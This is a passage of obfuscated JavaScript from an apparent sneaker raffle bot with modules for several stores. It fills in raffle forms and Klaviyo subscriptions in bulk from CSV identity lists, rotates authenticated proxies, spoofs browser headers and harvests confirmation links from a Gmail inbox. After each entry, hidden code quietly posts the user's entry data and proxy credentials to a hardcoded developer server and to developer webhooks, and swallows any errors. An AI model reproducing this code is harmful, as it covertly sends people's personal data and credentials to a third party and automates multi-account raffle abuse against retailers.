                            await _0x50b4f8(0x12c), console['log'](_0x3996da() + '\x20[' + _0x1cc3df['name'] + ']\x20Task\x20' + (_0x280dde + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5ae6f4['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x50b4f8(0x12c), await _0x5ae6f4['type']('#dwfrm_raffle_addressFields_firstName', _0x19bdc6[_0x280dde]['FirstName']), await _0x50b4f8(0x12c), await _0x5ae6f4['type']('#dwfrm_raffle_addressFields_lastName', _0x19bdc6[_0x280dde]['LastName']), await _0x50b4f8(0x12c), await _0x5ae6f4['select']('#dwfrm_raffle_addressFields_country', _0x19bdc6[_0x280dde]['Country']), await _0x50b4f8(0x12c), await _0x5ae6f4['type']('#dwfrm_raffle_addressFields_city', _0x19bdc6[_0x280dde]['City']), await _0x50b4f8(0x12c);
                            _0x19bdc6[_0x280dde]['Postcode'] == undefined && (_0x19bdc6[_0x280dde]['Postcode'] = _0x19bdc6[_0x280dde]['Zip']);
                            await _0x5ae6f4['type']('#dwfrm_raffle_addressFields_postalCode', _0x19bdc6[_0x280dde]['Postcode']), await _0x50b4f8(0x12c), await _0x5ae6f4['type']('#dwfrm_raffle_addressFields_address1', _0x19bdc6[_0x280dde]['Address1']), await _0x50b4f8(0x12c), await _0x5ae6f4['type']('#dwfrm_raffle_addressFields_address2', _0x19bdc6[_0x280dde]['HouseNumber']), await _0x50b4f8(0x12c), await _0x5ae6f4['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x19bdc6[_0x280dde]['Address2']), await _0x50b4f8(0x12c), await _0x5ae6f4['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x50b4f8(0x12c), await _0x5ae6f4['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x19bdc6[_0x280dde]['Follower']), await _0x50b4f8(0x1f4), await _0x5ae6f4['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x50b4f8(0x1f4), console['log'](_0x3996da() + '\x20[' + _0x1cc3df['name'] + ']\x20Task\x20' + (_0x280dde + 0x1) + '\x20:\x20' + _0x3c5615['blue']('Awaiting\x20Paypal\x20Payment')), await _0x5ae6f4['click']('.b-paypal_button');
                            try {
                                await _0x5ae6f4['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x2ef72b = 'no', _0x1474be(_0x19bdc6[_0x280dde], _0x1cc3df), console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x1cc3df['name'] + ']\x20Task\x20' + (_0x280dde + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x5efb54['succesDEVMSG']);
                                await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0x5efb54['succesDEVMSG']), await _0x50b4f8(0xc8), await _0x21ec0c(_0x171aec, _0x5efb54['succesPUBMSG']);
                                let _0x4ba3f9 = _0x19bdc6[_0x280dde];
                                try {
                                    prxdata = {
                                        'username': _0xeaf750['replace']('#', ''),
                                        'module': _0x1cc3df['name'],
                                        'entrydata': JSON['stringify'](_0x4ba3f9),
                                        'proxy': '' + _0x493083[_0x280dde]
                                    };
                                    var _0x335457 = JSON['stringify'](prxdata);
                                    let _0x40f901 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3c7f7c['post']('https://jraffles.herokuapp.com/success', _0x335457, _0x40f901);
                                } catch (_0x27119a) {
                                }
                            } catch (_0x5b359a) {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x1cc3df['name'] + ']\x20Task\x20' + (_0x280dde + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x5b359a)), _0x13b21e = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x5b359a;
                                var _0x7cfba5 = await _0x4808d0(_0x19bdc6[_0x280dde], _0x1cc3df, 'dev', !![], _0x13b21e);
                                _0x5efb54['errorDEV'] = { 'embeds': [_0x7cfba5] }, _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x5efb54['errorDEV']), await _0x21ec0c(_0x451f96, _0x5efb54['errorDEV']);
                            }
                        } catch (_0x2d9ee8) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x1cc3df['name'] + ']\x20Task\x20' + (_0x280dde + 0x1) + '\x20:\x20' + _0x2d9ee8)), _0x13b21e = '' + _0x2d9ee8;
                            var _0x7cfba5 = await _0x4808d0(_0x19bdc6[_0x280dde], _0x1cc3df, 'dev', !![], _0x13b21e);
                            _0x5efb54['errorDEV'] = { 'embeds': [_0x7cfba5] }, _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x5efb54['errorDEV']), await _0x21ec0c(_0x451f96, _0x5efb54['errorDEV']), _0x2ef72b = 'yes';
                        } finally {
                            _0x568902 && _0x568902['close']();
                            if (_0x2ef72b == 'yes' && _0x1976a9 != 0x5) {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x1cc3df['name'] + ']\x20Task\x20' + (_0x280dde + 0x1) + '\x20:\x20Retrying\x20(' + _0x1976a9 + '\x20/\x205)')), _0x280dde = _0x280dde - 0x1, _0x1976a9 = _0x1976a9 + 0x1;
                                continue;
                            }
                            _0x2ef72b == 'yes' && _0x1976a9 >= 0x5 && (_0x61dfa6(_0x19bdc6[_0x280dde], _0x1cc3df), _0x2ef72b = 'no', _0x1976a9 = 0x0), console['log']('Waiting\x20for\x20' + _0x409619['AfewDelay'] + '\x20ms'), await _0x50b4f8(_0x409619['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RLhP3P',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TRdHMm',
                                '$consent_form_version': 0x899638,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x431903, _0x47c5b6, _0x404a15) {
                    for (var _0x3319fa = 0x0; _0x3319fa < _0x47c5b6['length']; _0x3319fa++) {
                        try {
                            await _0x5a027c(_0x47c5b6, _0x3319fa);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x31cece(_0x5da2cc, _0x5fe55a, _0x18ce92, _0xfc9942, _0x28739c) {
                            var _0x3c4011, _0x37cc2a = {}, _0x5393c1 = [], _0x2a3e2e = {}, _0x5b1cc7 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x326e6c = Math['round'](Math['random']() * (_0x5b1cc7['length'] - 0x1));
                            !_0xfc9942 && (_0xfc9942 = {});
                            if (_0x5fe55a != 'ver') {
                                _0x5b3b18(_0x18ce92['name'] + '\x20Task\x20' + (_0x5da2cc + 0x1) + '\x20/\x20' + _0xfc9942['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870), await _0x5a027c(_0xfc9942, _0x5da2cc), _0x37cc2a = _0x18ce92['data'], _0x37cc2a['data']['attributes']['email'] = '' + _0xfc9942[_0x5da2cc]['Email'];
                                if (_0xfc9942[_0x5da2cc]['Size'] == 'RANDOM') {
                                }
                                _0x37cc2a['data']['attributes']['properties']['$first_name'] = '' + _0xfc9942[_0x5da2cc]['FirstName'], _0x37cc2a['data']['attributes']['properties']['$last_name'] = '' + _0xfc9942[_0x5da2cc]['LastName'], _0x37cc2a['data']['attributes']['properties']['$address1'] = _0xfc9942[_0x5da2cc]['Address1'] + '\x20' + _0xfc9942[_0x5da2cc]['Address2'] + '\x20' + _0xfc9942[_0x5da2cc]['HouseNumber'], _0x37cc2a['data']['attributes']['properties']['$zip'] = '' + _0xfc9942[_0x5da2cc]['Zip'], _0x37cc2a['data']['attributes']['properties']['$city'] = '' + _0xfc9942[_0x5da2cc]['City'], _0x37cc2a['data']['attributes']['properties']['$country'] = '' + _0xfc9942[_0x5da2cc]['Country'], _0xfc9942[_0x5da2cc]['Size'] == 'RANDOM' ? _0x37cc2a['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x5b1cc7[_0x326e6c] : _0x37cc2a['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0xfc9942[_0x5da2cc]['Size'], _0x37cc2a['data']['attributes']['properties']['$phone_number'] = '' + _0xfc9942[_0x5da2cc]['Phone'], _0x37cc2a['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0xfc9942[_0x5da2cc]['Follower'];
                            }
                            if (_0x409619['useRandomProxy'] = ![])
                                var _0x32830d = _0x28739c[_0x5da2cc]['split'](':');
                            else
                                var _0x30b7cf = Math['round'](Math['random']() * (_0x28739c['length'] - 0x1)), _0x32830d = _0x28739c[_0x30b7cf]['split'](':');
                            var _0x362c0c = {
                                'jar': _0x5037e5,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x18ce92['url'],
                                'headers': _0x18ce92['headers'],
                                'body': JSON['stringify'](_0x37cc2a),
                                'proxy': 'http://' + _0x32830d[0x2] + ':' + _0x32830d[0x3] + '@' + _0x32830d[0x0] + ':' + _0x32830d[0x1]
                            };
                            return _0x5fe55a != 'ver' && (_0x362c0c['url'] = _0x18ce92['url'], _0x362c0c['headers'] = _0x18ce92['headers']), _0x5fe55a == 'ver' && (_0x362c0c['method'] = 'GET'), new Promise(function (_0xc5170c, _0x74a82f) {
                                callback = async (_0x53c3c3, _0x23976a, _0x4d41d5) => {
                                    if (!_0x53c3c3 && _0x23976a['statusCode'] == 0xca || !_0x53c3c3 && _0x23976a['statusCode'] == 0xc8) {
                                        if (_0x5fe55a != 'ver') {
                                            var _0x2f0f71 = await _0x4808d0(_0xfc9942[_0x5da2cc], _0x18ce92, 'dev', ![]), _0x316674 = await _0x4808d0(_0xfc9942[_0x5da2cc], _0x18ce92, 'pub', ![]);
                                            const _0xba9cd7 = {
                                                'succesDEVMSG': { 'embeds': [_0x2f0f71] },
                                                'succesPUBMSG': { 'embeds': [_0x316674] }
                                            };
                                            let _0x1b80b3 = _0xfc9942[_0x5da2cc];
                                            try {
                                                prxdata = {
                                                    'username': _0xeaf750['replace']('#', ''),
                                                    'module': _0x18ce92['name'],
                                                    'entrydata': JSON['stringify'](_0x1b80b3),
                                                    'proxy': '' + _0x28739c[_0x5da2cc]
                                                };
                                                var _0x1847e5 = JSON['stringify'](prxdata);
                                                let _0x5f5842 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x3c7f7c['post']('https://jraffles.herokuapp.com/success', _0x1847e5, _0x5f5842);
                                            } catch (_0x193cb7) {
                                            }
                                            if (_0x409619['webhook'] != undefined && _0x409619['webhook'] != '')
                                                try {
                                                    await _0x21ec0c(_0x409619['webhook'], _0xba9cd7['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0xba9cd7['succesDEVMSG']), await _0x50b4f8(0xc8);
                                            try {
                                                await _0x21ec0c(_0x171aec, _0xba9cd7['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x1474be(_0xfc9942[_0x5da2cc], _0x18ce92);
                                        }
                                        _0xc5170c(console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x18ce92['name'] + ']\x20Task\x20' + (_0x5da2cc + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x5fe55a != 'ver') {
                                            var _0x33a78d = '' + _0x53c3c3, _0x51897d = await _0x4808d0(_0xfc9942[_0x5da2cc], _0x18ce92, 'dev', !![], _0x33a78d), _0x41b860 = {};
                                            _0x41b860['errorDEV'] = { 'embeds': [_0x51897d] }, _0x61dfa6(_0xfc9942[_0x5da2cc], _0x18ce92), _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x41b860['errorDEV']), await _0x21ec0c(_0x451f96, _0x41b860['errorDEV']);
                                        }
                                        _0x74a82f(console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x18ce92['name'] + ']\x20Task\x20' + (_0x5da2cc + 0x1) + ':\x20' + _0x53c3c3)));
                                    }
                                };
                                try {
                                    _0x5fe55a != 'ver' && console['log'](_0x3996da() + '\x20[' + _0x18ce92['name'] + ']\x20Task\x20' + (_0x5da2cc + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x37cc2a['data']['attributes']['email']), _0x2131de(_0x362c0c, callback);
                                } catch (_0x25a824) {
                                    console['log'](_0x3996da() + '\x20Task\x20' + (_0x5da2cc + 0x1) + ':\x20' + _0x25a824);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x31cece(_0x3319fa, 'nor', _0x431903, _0x47c5b6, _0x404a15), console['log'](_0x3996da() + '\x20[' + _0x431903['name'] + ']\x20Sleeping\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                        } catch (_0xcfc9fc) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5ccb50, _0x291b0c, _0x58caac) {
                    var _0x5a6ea0 = [], _0x55c4c0 = ![];
                    async function _0x36cf3b() {
                        var _0xd3fe65 = new _0x51510b({
                            'user': _0x409619['masterMail'],
                            'password': _0x409619['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x293570(_0x5065be) {
                            _0xd3fe65['openBox']('INBOX', ![], _0x5065be);
                        }
                        _0xd3fe65['once']('ready', function () {
                            _0x293570(function (_0x5d218d, _0x1f43da) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x5d218d)
                                    throw _0x5d218d;
                                _0xd3fe65['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x569013, _0x342e02) {
                                    if (!_0x342e02 || !_0x342e02['length'])
                                        console['log'](_0x3996da() + '\x20[' + _0x5ccb50['name'] + ']\x20No\x20mails\x20found'), _0xd3fe65['end']();
                                    else {
                                        var _0x4a6408 = _0xd3fe65['seq']['fetch'](_0x342e02, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4a6408['on']('message', function (_0x199523, _0x320450) {
                                            var _0x1cd53e = '(#' + _0x320450 + ')\x20';
                                            _0x199523['on']('body', function (_0x175759, _0x2f8e73) {
                                                _0x3f1b1e(_0x175759, (_0x2012ad, _0x448a0f) => {
                                                    var _0x325e1a = _0x448a0f['text']['split']('(')[0x1], _0x101283 = _0x325e1a['split'](')')[0x0];
                                                    _0x5a6ea0['push'](_0x101283);
                                                });
                                            }), _0x199523['once']('end', function () {
                                            });
                                        }), _0x4a6408['once']('error', function (_0x235409) {
                                            console['log']('Fetch\x20error:\x20' + _0x235409), _0x55c4c0 = !![];
                                        }), _0x4a6408['once']('end', function () {
                                            _0xd3fe65['end']();
                                        });
                                    }
                                });
                            });
                        }), _0xd3fe65['once']('error', function (_0x72712f) {
                            console['log'](_0x3c5615['red'](_0x72712f['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x55c4c0 = !![];
                        }), _0xd3fe65['once']('end', async function () {
                            _0x55c4c0 = !![];
                        }), _0xd3fe65['connect']();
                    }
                    async function _0x113d3f(_0x46a42d, _0x5ce063, _0x36b181) {
                        for (var _0x2d1188 = 0x0; _0x2d1188 < _0x5ce063['length']; _0x2d1188++) {
                            async function _0x843339(_0x5c4006, _0x471890, _0x46ba34, _0x4a2d24, _0x2cdc26) {
                                var _0x321b9e, _0xb17b11 = {}, _0xb6f8a5 = [], _0x26f98c = {}, _0x94a29b = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x4a8430 = Math['round'](Math['random']() * (_0x94a29b['length'] - 0x1));
                                _0x4a2d24[_0x5c4006]['Size'] == 'RANDOM' && (_0x4a2d24[_0x5c4006]['Size'] = _0x94a29b[_0x4a8430]);
                                !_0x4a2d24 && (_0x4a2d24 = {});
                                if (_0x409619['useRandomProxy'] = ![])
                                    var _0x294c6c = _0x2cdc26[_0x5c4006]['split'](':');
                                else
                                    var _0x3d5cc1 = Math['round'](Math['random']() * (_0x2cdc26['length'] - 0x1)), _0x294c6c = _0x2cdc26[_0x3d5cc1]['split'](':');
                                var _0x2fce9a = {
                                    'jar': _0x5037e5,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x46ba34['url'],
                                    'headers': _0x46ba34['headers'],
                                    'body': JSON['stringify'](_0xb17b11),
                                    'proxy': 'http://' + _0x294c6c[0x2] + ':' + _0x294c6c[0x3] + '@' + _0x294c6c[0x0] + ':' + _0x294c6c[0x1]
                                };
                                return _0x471890 != 'ver' && (_0x2fce9a['url'] = _0x46ba34['url'], _0x2fce9a['headers'] = _0x46ba34['headers']), _0x471890 == 'ver' && (_0x2fce9a['method'] = 'GET', _0x2fce9a['url'] = _0x4a2d24[_0x5c4006]), new Promise(function (_0x3ce3a7, _0x29fb20) {
                                    callback = async (_0x5a2cab, _0x4432d0, _0x53810b) => {
                                        if (!_0x5a2cab && _0x4432d0['statusCode'] == 0xca || !_0x5a2cab && _0x4432d0['statusCode'] == 0xc8) {
                                            if (_0x471890 != 'ver') {
                                                var _0x1e9d1c = await _0x4808d0(_0x4a2d24[_0x5c4006], _0x46ba34, 'dev', ![]), _0x57839c = await _0x4808d0(_0x4a2d24[_0x5c4006], _0x46ba34, 'pub', ![]);
                                                const _0x264943 = {
                                                    'succesDEVMSG': { 'embeds': [_0x1e9d1c] },
                                                    'succesPUBMSG': { 'embeds': [_0x57839c] }
                                                };
                                                if (_0x409619['webhook'] != undefined && _0x409619['webhook'] != '')
                                                    try {
                                                        await _0x21ec0c(_0x409619['webhook'], _0x264943['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0x264943['succesDEVMSG']), await _0x50b4f8(0xc8);
                                                try {
                                                    await _0x21ec0c(_0x171aec, _0x264943['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x1474be(_0x4a2d24[_0x5c4006], _0x46ba34);
                                            }
                                            _0x3ce3a7(console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x46ba34['name'] + ']\x20Task\x20' + (_0x5c4006 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x471890 != 'ver') {
                                                var _0x5e442b = '' + _0x5a2cab, _0x5e1ce3 = await _0x4808d0(_0x4a2d24[_0x5c4006], _0x46ba34, 'dev', !![], _0x5e442b), _0x2cecc8 = {};
                                                _0x2cecc8['errorDEV'] = { 'embeds': [_0x5e1ce3] }, _0x61dfa6(_0x4a2d24[_0x5c4006], _0x46ba34), _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x2cecc8['errorDEV']), await _0x21ec0c(_0x451f96, _0x2cecc8['errorDEV']);
                                            }
                                            _0x29fb20(console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x46ba34['name'] + ']\x20Task\x20' + (_0x5c4006 + 0x1) + ':\x20' + _0x5a2cab)));
                                        }
                                    };
                                    try {
                                        _0x471890 != 'ver' ? console['log'](_0x3996da() + '\x20[' + _0x46ba34['name'] + ']\x20Task\x20' + (_0x5c4006 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xb17b11['data']['attributes']['email']) : console['log'](_0x3996da() + '\x20[' + _0x46ba34['name'] + ']\x20Task\x20' + (_0x5c4006 + 0x1) + ':\x20Fetching\x20Response'), _0x2131de(_0x2fce9a, callback);
                                    } catch (_0x3d93ae) {
                                        console['log'](_0x3996da() + '\x20Task\x20' + (_0x5c4006 + 0x1) + ':\x20' + _0x3d93ae);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x843339(_0x2d1188, 'ver', _0x46a42d, _0x5ce063, _0x36b181), console['log'](_0x3996da() + '\x20[' + _0x46a42d['name'] + ']\x20Sleeping\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                            } catch (_0x2dae80) {
                            }
                        }
                    }
                    try {
                        _0x36cf3b();
                        while (!_0x55c4c0) {
                            await _0x50b4f8(0xbb8);
                        }
                        console['log']('Found\x20' + _0x5a6ea0['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x50b4f8(0x9c4);
                    }
                    await _0x113d3f(_0x5ccb50, _0x5a6ea0, _0x58caac);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'X4md8Z',
                            'custom_source': 'DZ4137-106',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WspqGE',
                                '$consent_form_version': 0x89a2a4,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x338c64, _0x41acbb, _0x365d4d) {
                    for (var _0x484c01 = 0x0; _0x484c01 < _0x41acbb['length']; _0x484c01++) {
                        try {
                            await _0x5a027c(_0x41acbb, _0x484c01);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x484d71(_0x19cb12, _0x3b1313, _0x138af2, _0x48e566, _0x5a39fa) {
                            var _0x3a4380, _0x13b602 = {}, _0x2dad0f = [], _0x120450 = {}, _0x2093c8 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x1a427d = Math['round'](Math['random']() * (_0x2093c8['length'] - 0x1));
                            !_0x48e566 && (_0x48e566 = {});
                            if (_0x3b1313 != 'ver') {
                                _0x5b3b18(_0x138af2['name'] + '\x20Task\x20' + (_0x19cb12 + 0x1) + '\x20/\x20' + _0x48e566['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870), _0x2dad0f = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0xeaf750
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x48e566[_0x19cb12]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x409619['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x41a50b
                                        }
                                    ]
                                }], _0x120450 = { 'embeds': _0x2dad0f }, _0x13b602 = _0x138af2['data'], _0x13b602['data']['attributes']['email'] = '' + _0x48e566[_0x19cb12]['Email'];
                                if (_0x48e566[_0x19cb12]['Size'] == 'RANDOM') {
                                }
                                _0x13b602['data']['attributes']['properties']['$first_name'] = '' + _0x48e566[_0x19cb12]['FirstName'], _0x13b602['data']['attributes']['properties']['$last_name'] = '' + _0x48e566[_0x19cb12]['LastName'], _0x13b602['data']['attributes']['properties']['$address1'] = _0x48e566[_0x19cb12]['Address1'] + '\x20' + _0x48e566[_0x19cb12]['Address2'] + '\x20' + _0x48e566[_0x19cb12]['HouseNumber'], _0x13b602['data']['attributes']['properties']['$zip'] = '' + _0x48e566[_0x19cb12]['Zip'], _0x13b602['data']['attributes']['properties']['$city'] = '' + _0x48e566[_0x19cb12]['City'], _0x13b602['data']['attributes']['properties']['$country'] = '' + _0x48e566[_0x19cb12]['Country'], _0x48e566[_0x19cb12]['Size'] == 'RANDOM' ? _0x13b602['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2093c8[_0x1a427d] : _0x13b602['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x48e566[_0x19cb12]['Size'], _0x13b602['data']['attributes']['properties']['$phone_number'] = '' + _0x48e566[_0x19cb12]['Phone'], _0x13b602['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x48e566[_0x19cb12]['Follower'];
                            }
                            if (_0x409619['useRandomProxy'] = ![])
                                var _0xf24474 = _0x5a39fa[_0x19cb12]['split'](':');
                            else
